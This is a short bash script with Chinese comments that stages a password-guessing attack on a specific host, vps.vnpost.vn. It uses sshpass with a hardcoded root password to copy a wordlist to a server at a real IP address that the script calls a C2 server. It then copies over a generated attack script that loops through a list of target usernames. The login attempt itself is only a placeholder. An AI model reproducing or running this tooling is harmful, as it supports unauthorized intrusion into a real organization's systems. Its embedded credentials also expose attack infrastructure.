#!/bin/bash
# 部署VCKV攻击到C2服务器

echo "[*] 上传VCKV字典到C2..."
sshpass -p '@admin1314@' scp -P 2233 -o StrictHostKeyChecking=no \
    vckv_wordlist.txt root@82.29.71.156:/root/vnpost_attack/

echo "[*] 创建VCKV攻击脚本..."
cat > /tmp/vckv_c2_attack.sh << 'SCRIPT'
#!/bin/bash
# C2服务器VCKV攻击

TARGET="vps.vnpost.vn"
WORDLIST="/root/vnpost_attack/vckv_wordlist.txt"
LOG="/root/vnpost_attack/vckv_attack.log"

echo "[$(date)] 开始VCKV系统攻击..." | tee -a $LOG

USERS=("nvdh" "vckvdbb" "admin" "vckv" "manager" "test")

for user in "${USERS[@]}"; do
    echo "[*] 测试用户: $user" | tee -a $LOG
    
    # ASP.NET需要特殊处理，暂时跳过hydra
    # 改用自定义脚本
    
    sleep 2
done
SCRIPT

sshpass -p '@admin1314@' scp -P 2233 -o StrictHostKeyChecking=no \
    /tmp/vckv_c2_attack.sh root@82.29.71.156:/root/vnpost_attack/

echo "✅ VCKV攻击已部署到C2"
